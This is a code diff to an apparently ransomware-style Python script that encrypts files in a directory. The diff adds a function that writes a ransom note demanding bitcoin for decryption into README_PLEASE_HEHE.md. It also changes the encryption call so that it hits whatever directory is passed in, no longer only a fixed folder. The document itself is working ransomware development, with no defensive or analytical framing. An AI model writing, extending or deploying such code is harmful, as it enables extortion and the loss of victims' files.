@@ -272,6 +272,16 @@ def encrypt_files_with_best_cipher(folder_path, encryption_results):
     print("Encryption done.")
 
 
+def ransom_note(file_path):
+    ransom_note_content = (
+        "## EncrYPted HQHQHQHQ\n\n"
+        "To dEcrypt them, you must send some bitCOins.\n\n"
+        "> Remember, we've always defined ourselves by the ability to overcome the impossible, (this ain't impossible tho qhqh)\n\n"
+    )
+    with open(file_path, "w") as ransom_note_file:
+        ransom_note_file.write(ransom_note_content)
+
+
 
 def run_file(directory_to_check):
     priortized_files, only_header = priortize_files(directory_to_check)
@@ -282,7 +292,8 @@ def run_file(directory_to_check):
     print("Total Encryption Time (s):", encryption_time_sum, "\n")
 
     print("\the he he siuuu!\n")        
-    encrypt_files_with_best_cipher(r"Files", encryption_results)
+    encrypt_files_with_best_cipher(directory_to_check, encryption_results)
     print("\n")
+    ransom_note(f"{directory_to_check}/README_PLEASE_HEHE.md")
 
 run_file(r"files")
